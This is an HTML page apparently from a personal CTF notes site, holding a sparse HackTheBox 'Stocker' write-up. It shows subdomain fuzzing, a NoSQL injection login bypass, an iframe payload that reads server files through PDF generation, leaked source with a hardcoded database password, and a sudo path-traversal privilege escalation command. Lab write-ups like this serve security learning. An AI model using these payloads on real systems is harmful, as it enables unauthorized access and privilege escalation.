@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>stocker · Will Seligman</title>
+<link rel="stylesheet" href="/assets/style.css">
+</head>
+<body>
+<button id="menu-toggle" aria-label="Toggle navigation">&#9776; Menu</button>
+<div class="layout">
+<aside class="sidebar" id="sidebar">
+  <a class="brand" href="/index.html">
+    <span class="brand-flag">&#127988;</span>
+    <span class="brand-text"><strong>Will Seligman</strong><small>Cybersecurity Notes & CTF Writeups</small></span>
+  </a>
+  <nav class="nav" id="nav-root" data-current="htb/machines/stocker.html"></nav>
+</aside>
+<main class="content">
+  <article class="doc">
+  <div class="breadcrumb"><a href="/htb/index.html">HackTheBox</a> &rsaquo; <a href="/htb/machines/index.html">Completed Machines</a></div>
+  <h1 id="stocker">stocker</h1>
+<p><span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<pre><code>ffuf -u http://stocker.htb -w ../bitquark-subdomains-top100000.txt -H &quot;HOST: FUZZ.stocker.htb&quot; -mc 302
+</code></pre>
+<p><span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<pre><code>ffuf -u http://dev.stocker.htb/login -c -w /home/htb-theblackcat/my_data/NoSQL.txt -X POST -d 'username=adminFUZZ&amp;password=admin' -H 'Content-Type: application/x-www-form-urlencoded'
+</code></pre>
+<p><span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<pre><code>ffuf -u http://dev.stocker.htb/login -c -w /home/htb-theblackcat/my_data/NoSQL.txt -X POST -d '{&quot;username&quot;:{&quot;$ne&quot;:&quot;null&quot;},&quot;password&quot;:{&quot;$ne&quot;:&quot;null&quot;}}' -H 'Content-Type: application/json'
+</code></pre>
+<pre><code>gobuster vhost -u stocker.htb -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt --append-domain
+</code></pre>
+<p>https://github.com/OWASP/Amass/blob/master/examples/wordlists/subdomains-top1mil-20000.txt</p>
+<p><span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<p>http://dev.stocker.htb/api/po/63f10bf08708b73de16f2c16</p>
+<p><span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<p>user angoose</p>
+<pre><code>&quot;&lt;iframe src=file:///var/www/dev/index.js height=1000px width=800px&gt;&lt;/iframe&gt;&quot;
+</code></pre>
+<p><span class="img-missing">image unavailable</span></p>
+<pre><code class="language-js">const express = require(&quot;express&quot;);
+const mongoose = require(&quot;mongoose&quot;);
+const session = require(&quot;express-session&quot;);
+const MongoStore = require(&quot;connect-mongo&quot;);
+const path = require(&quot;path&quot;);
+const fs = require(&quot;fs&quot;);
+const { generatePDF, formatHTML } = require(&quot;./pdf.js&quot;);
+const { randomBytes, createHash } = require(&quot;crypto&quot;);
+const app = express();
+const port = 3000;
+// TODO: Configure loading from dotenv for production
+const dbURI = &quot;mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&amp;w=1&quot;;
+app.use(express.json());
+app.use(express.urlencoded({ extended: false }));
+app.use(
+  session({
+    secret: randomBytes(32).toString(&quot;hex&quot;),
+    resave: false,
+    saveUninitialized: true,
+    store: MongoStore.create({
+      mongoUrl: dbURI,
+    }),
+  })
+);
+app.use(&quot;/static&quot;, express.static(__dirname + &quot;/assets&quot;));
+app.get(&quot;/&quot;, (req, res) =&gt; {
+  return res.redirect(&quot;/login&quot;);
+});
+app.get(&quot;/api/products&quot;, async (req, res) =&gt; {
+  if (!req.session.user) return res.json([]);
+  const products = await mongoose.model(&quot;Product&quot;).find();
+  return res.json(products);
+});
+app.get(&quot;/login&quot;, (req, res) =&gt; {
+  if (req.session.user) return res.redirect(&quot;/stock&quot;);
+  return res.sendFile(__dirname + &quot;/templates/login.html&quot;);
+});
+app.post(&quot;/login&quot;, async (req, res) =&gt; {
+  const { username, password } = req.body;
+  if (!username || !password) return res.redirect(&quot;/login?error=login-error&quot;);
+  // TODO: Implement hashing
+  const user = await mongoose.model(&quot;User&quot;).findOne({ username, password });
+  if (!user) return res.redirect(&quot;/login?error=login-error&quot;);
+  req.session.user = user.id;
+  console.log(req.session);
+  return res.redirect(&quot;/stock&quot;);
+});
+app.post(&quot;/api/order&quot;, async (req, res) =&gt; {
+  if (!req.session.user) return res.json({});
+</code></pre>
+<pre><code>angoose
+IHeardPassphrasesArePrettySecure
+</code></pre>
+<p><span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<pre><code>sudo /usr/bin/node /usr/local/scripts/../../../../../home/angoose/escalation.js
+</code></pre>
+<p><span class="img-missing">image unavailable</span></p>
+<p>effin sticky</p>
+<p><span class="img-missing">image unavailable</span></p>
+  </article>
+  <footer class="foot">Notes by Will Seligman · built from Notion</footer>
+</main>
+</div>
+<script src="/assets/nav.js" defer></script>
+<script>
+document.getElementById('menu-toggle').addEventListener('click',function(){
+  document.getElementById('sidebar').classList.toggle('open');
+});
+</script>
+</body>
+</html>
